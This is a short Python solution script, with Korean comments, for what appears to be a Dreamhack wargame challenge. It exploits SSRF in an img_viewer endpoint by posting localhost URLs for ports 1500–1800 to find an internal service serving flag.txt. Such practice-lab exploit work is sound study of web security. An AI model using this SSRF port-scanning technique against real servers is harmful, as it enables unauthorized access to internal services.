import requests
# 어디에 공격할지 ~
target_url = 'http://host3.dreamhack.games:13082/img_viewer'

#포트번호 시작,끝
start_port = 1500
end_port = 1800

# 포트번호 반복
for port in range(start_port, end_port):
    # url 칸에 넣는 ~
    payload_url = f'http://Localhost:{port}/flag.txt'  # 포트 번호를 동적으로 추가

    
    data = {
        'url': payload_url  
    }

    # 서버로 POST 요청을 보내서 SSRF 실행 시킴
    response = requests.post(target_url, data=data, timeout=5).text

    notfound = "iVBORw" #error.png base64 인코딩 되서 나오는 시작 문자열

    if not notfound in response: # 만약 iVBORw 가 없을때 또는 error.png 가 뜨지 않을때
        print(f"{port} open")
        break
#포트번호가 나온다면 url 에 넣어서 바로 확인해보기